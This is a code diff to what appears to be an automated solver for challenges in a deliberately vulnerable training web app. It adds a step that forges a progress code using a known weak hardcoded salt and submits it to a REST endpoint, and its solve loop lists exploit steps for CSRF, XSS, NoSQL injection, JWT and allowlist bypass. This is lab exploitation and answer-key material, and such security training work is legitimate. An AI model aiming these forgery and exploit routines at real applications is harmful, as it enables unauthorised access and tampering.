@@ -402,6 +402,17 @@ def _privacy_and_jwt(c):
         pass
 
 
+def _imaginary(c):
+    """Imaginary Challenge — the hacking-progress 'continue code' is hashids-encoded with a
+    hardcoded weak salt ('this is my salt'), so we forge a code claiming challenge #999 (which
+    does not exist) was solved. The forged code is deterministic, so it is hardcoded here."""
+    code = "69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj"
+    try:
+        c.put("/rest/continue-code/apply/" + code)
+    except Exception:
+        pass
+
+
 def _csrf(c):
     """CSRF — cross-origin POST /profile (Origin = the app's configured CSRF url) with a changed
     username; the profile update trusts the cookie token and mis-validates the request origin."""
@@ -517,7 +528,7 @@ def solve(base_url: str) -> dict:
                      _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
                      _forged_coupon, _two_factor, _feedback_patterns, _csrf, _change_bender,
                      _multiple_likes, _reflected_and_nosql, _api_and_header_xss, _serverside_xss,
-                     _allowlist_bypass, _privacy_and_jwt):
+                     _allowlist_bypass, _privacy_and_jwt, _imaginary):
             try:
                 step(c)
             except Exception:
